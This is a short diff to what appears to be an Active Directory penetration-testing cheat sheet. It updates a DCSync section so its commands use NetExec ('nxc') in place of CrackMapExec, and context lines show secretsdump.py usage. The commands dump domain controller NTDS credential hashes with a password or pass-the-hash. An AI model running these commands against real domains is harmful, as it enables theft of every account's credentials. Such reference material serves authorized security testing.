@@ -52,12 +52,12 @@ secretsdump.py -k -no-pass 'DOMAIN/DC01$@DC_FQDN' -just-dc
 
 **Note:** With Kerberos (`-k`) target the DC by its **FQDN**, not its IP.
 
-### DCSync (CrackMapExec / NetExec)
+### DCSync (NetExec)
 
 ```bash
 
-cme smb DC_IP -u 'USER_NAME' -p 'USER_PASS' --ntds
-cme smb DC_IP -u 'USER_NAME' -H 'USER_NT_HASH' --ntds
+nxc smb DC_IP -u 'USER_NAME' -p 'USER_PASS' --ntds
+nxc smb DC_IP -u 'USER_NAME' -H 'USER_NT_HASH' --ntds
 
 ```
 
